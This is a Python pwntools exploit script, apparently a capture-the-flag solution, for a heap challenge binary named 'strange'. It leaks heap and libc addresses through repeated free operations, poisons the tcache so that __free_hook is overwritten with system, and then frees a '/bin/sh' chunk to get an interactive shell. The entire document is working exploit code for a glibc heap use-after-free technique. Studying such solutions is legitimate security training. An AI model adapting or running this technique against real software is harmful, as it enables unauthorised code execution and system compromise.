#!/usr/bin/env python2
from pwn import *

s = process("./strange")

def recvexact(exact):
    def pred(data):
        if not exact.startswith(data):
            s.unrecv(data)
            raise ValueError(s.recv())
        return exact == data
    return s.recvpred(pred)

s.recvexact = recvexact

s.recvexact("This is a mysql server\n")
s.send("CoeMjFHDnIF3z1t0xSQCgxAbrIiLII08YVlG927hNFW1tZ8N9X3Md5z6uEFwikWC")
s.recvexact("Welcome to the actual server! CTF 2Fort Instant Respawn 24/7!\n")

def give_me_data(red="\0", blue="\0"):
    s.recvexact("Give me a choice:\n")
    s.send("1")
    s.recvexact("Give me red data\n")
    s.send(red)
    s.recvexact("Give me blue data\n")
    s.send(blue)

def kill():
    s.recvexact("Give me a choice:\n")
    s.send("3")

def show_data():
    s.recvexact("Give me a choice:\n")
    s.send("5")
    red = u64(s.recvuntil("\n")[:-1].ljust(8, b"\0"))
    blue = u64(s.recvuntil("\n")[:-1].ljust(8, b"\0"))
    return red, blue

def erase():
    s.recvexact("Give me a choice:\n")
    s.send("0")

def leak_heap():
    give_me_data()
    kill()
    red, blue = show_data()
    erase()
    return red - 0x350

def leak_libc():
    give_me_data()
    kill()
    kill()
    kill()
    kill()
    red, blue = show_data()
    erase()
    s.recvexact("Give me a choice:\n")
    s.send("6")
    return red - 0x3ebca0

heap = leak_heap()
log.info("heap: 0x%x", heap)

libc = leak_libc()
log.info("libc: 0x%x", libc)

elf = ELF("./libc.so.6")

give_me_data()
kill()
kill()
erase()
give_me_data(red=p64(libc + elf.symbols.__free_hook))
erase()
give_me_data(blue=p64(libc + elf.symbols.system))
erase()
give_me_data(red="/bin/sh")
kill()

s.interactive()
